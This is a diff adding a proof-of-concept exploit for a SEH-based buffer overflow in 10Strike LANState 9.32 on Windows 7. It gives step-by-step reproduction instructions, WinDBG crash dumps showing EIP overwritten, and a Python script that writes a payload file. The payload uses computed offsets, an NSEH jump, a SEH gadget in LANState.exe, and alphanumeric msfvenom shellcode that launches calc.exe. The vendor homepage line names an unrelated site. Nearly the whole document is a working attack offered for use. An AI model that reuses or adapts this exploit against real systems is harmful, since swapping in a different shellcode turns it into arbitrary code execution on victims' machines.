@@ -1,0 +1,124 @@
+# Exploit Title: 10Strike LANState 9.32 - 'Force Check' Buffer Overflow (SEH)
+# Date: 2020-04-01
+# Exploit Author: Hodorsec
+# Version: v9.32 x86
+# Software Link: https://www.10-strike.com/lanstate/lanstate-setup.exe
+# Vendor Homepage:  https://www.freecommander.com
+# Tested on:        Win7 x86 SP1 - Build 7601
+
+# Description:      
+# - Exploits the "Force Check" option when listing the Host Checks in option "Check List". Entering an overly long string, results in a crash which overwrites SEH.
+
+# Reproduction:
+# - Use indicated OS or manipulate settings: your mileage may vary due to different offsets on other Windows versions / SP's.
+# - Run the script, a TXT file will be generated
+# - On the Windows machine, open the TXT file in Wordpad. Copy the contents to clipboard (ctrl+c)
+# - Open LANState, use any "Map", for example the "demo_map"
+# - Click on tab "Home", click option "Check List"
+# - Rightclick on any existing hostname and click "Edit"
+# - Paste the value from clipboard in the field "Host address (name)"
+# - Next, Next, Finish
+# - In the "List of checks" overview, select the modified host and press the spacebar (Force Check)
+# - Check results
+
+# WinDBG initial crash output using only A's:
+# (c5c.c2c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00002759 ebx=0012f838 ecx=000007f6 edx=0012f880 esi=0781bf78 edi=00130000
+# eip=00402e57 esp=0012f7d8 ebp=0012f99c iopl=0         nv up ei pl nz na po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202
+# *** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\10-Strike LANState\LANState.exe
+# LANState+0x2e57:
+# 00402e57 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+# 0:000> g
+# (c5c.c2c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=0012f98c ebx=0012f98c ecx=05250858 edx=41414141 esi=00000002 edi=0012f7f0
+# eip=004053e6 esp=0012f7f8 ebp=0012f99c iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
+# LANState+0x53e6:
+# 004053e6 8b4af8          mov     ecx,dword ptr [edx-8] ds:0023:41414139=????????
+# 0:000> g
+# (c5c.c2c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000000 ebx=00000000 ecx=41414141 edx=77f0720d esi=00000000 edi=00000000
+# eip=41414141 esp=0012f298 ebp=0012f2b8 iopl=0         nv up ei pl zr na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
+# 41414141 ??              ???
+
+#!/usr/bin/python
+
+import sys,struct
+
+# Filename
+filename = "10_strike_lanstate-poc.txt"
+
+# Maximum length
+maxlen = 10000
+
+# Shellcode, using alphanum chars due to bytes considered to be bad above \x7f
+# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f c -v shellcode
+# Payload size: 447 bytes
+shellcode = (
+"\xdb\xdc\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x49\x49\x49"
+"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
+"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
+"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
+"\x4c\x78\x68\x6d\x52\x65\x50\x37\x70\x77\x70\x43\x50\x4d\x59"
+"\x39\x75\x36\x51\x59\x50\x32\x44\x6e\x6b\x32\x70\x46\x50\x6e"
+"\x6b\x70\x52\x34\x4c\x6e\x6b\x61\x42\x45\x44\x4c\x4b\x54\x32"
+"\x47\x58\x36\x6f\x6e\x57\x53\x7a\x66\x46\x46\x51\x79\x6f\x4e"
+"\x4c\x37\x4c\x51\x71\x53\x4c\x44\x42\x44\x6c\x61\x30\x4a\x61"
+"\x68\x4f\x66\x6d\x73\x31\x49\x57\x59\x72\x58\x72\x30\x52\x56"
+"\x37\x4e\x6b\x52\x72\x34\x50\x6c\x4b\x33\x7a\x35\x6c\x6c\x4b"
+"\x42\x6c\x57\x61\x74\x38\x6d\x33\x33\x78\x77\x71\x4b\x61\x32"
+"\x71\x6e\x6b\x51\x49\x77\x50\x76\x61\x6a\x73\x6e\x6b\x61\x59"
+"\x67\x68\x79\x73\x57\x4a\x42\x69\x4e\x6b\x37\x44\x6c\x4b\x43"
+"\x31\x4e\x36\x45\x61\x6b\x4f\x6c\x6c\x6a\x61\x48\x4f\x34\x4d"
+"\x47\x71\x5a\x67\x37\x48\x39\x70\x62\x55\x4b\x46\x65\x53\x63"
+"\x4d\x39\x68\x67\x4b\x73\x4d\x46\x44\x53\x45\x79\x74\x76\x38"
+"\x4c\x4b\x63\x68\x66\x44\x43\x31\x48\x53\x72\x46\x4e\x6b\x76"
+"\x6c\x70\x4b\x4e\x6b\x61\x48\x57\x6c\x46\x61\x79\x43\x6c\x4b"
+"\x54\x44\x6e\x6b\x57\x71\x68\x50\x6e\x69\x30\x44\x76\x44\x45"
+"\x74\x53\x6b\x61\x4b\x65\x31\x62\x79\x31\x4a\x30\x51\x39\x6f"
+"\x59\x70\x63\x6f\x71\x4f\x50\x5a\x6c\x4b\x56\x72\x4a\x4b\x6c"
+"\x4d\x73\x6d\x30\x6a\x77\x71\x6e\x6d\x4d\x55\x4e\x52\x37\x70"
+"\x75\x50\x63\x30\x52\x70\x63\x58\x56\x51\x4e\x6b\x42\x4f\x4e"
+"\x67\x69\x6f\x49\x45\x4d\x6b\x58\x70\x4d\x65\x6d\x72\x50\x56"
+"\x75\x38\x6e\x46\x6f\x65\x6f\x4d\x6d\x4d\x39\x6f\x58\x55\x75"
+"\x6c\x63\x36\x73\x4c\x76\x6a\x6b\x30\x59\x6b\x4d\x30\x52\x55"
+"\x74\x45\x6f\x4b\x43\x77\x42\x33\x63\x42\x62\x4f\x51\x7a\x77"
+"\x70\x73\x63\x69\x6f\x58\x55\x72\x43\x30\x61\x72\x4c\x31\x73"
+"\x46\x4e\x45\x35\x63\x48\x63\x55\x47\x70\x41\x41"
+)
+
+# Offsets
+crash_ebp = 228
+crash_nseh = 236
+crash_seh = crash_nseh + 4
+
+# Variables
+nops = "\x90" * 16                                              # Nops
+
+# Prefix
+prefix = "A" * crash_nseh                                       # Filler
+nseh = "\x71\x06\x70\x04"                                       # JNO # JO # Jump over NSEH/SEH
+seh = struct.pack("<L", 0x0132730f)                             # call dword ptr ss:[ebp-04] # [LANState.exe]
+suffix = nops                                                   # Old-school NOP'ing
+suffix += shellcode                                             # Magic!
+suffix += "D" * (maxlen - len(prefix + nseh + seh + suffix))    # Filler
+
+# Concatenate string for payload
+payload = prefix + nseh + seh + suffix                          # Put it all together
+
+try:
+    file = open(filename,"wb")
+    file.write(payload)
+    file.close()
+    print "[+] File " + filename + " with size " + str(len(payload)) + " created successfully"
+except:
+    print "[!] Error creating file!"
+    sys.exit(0)
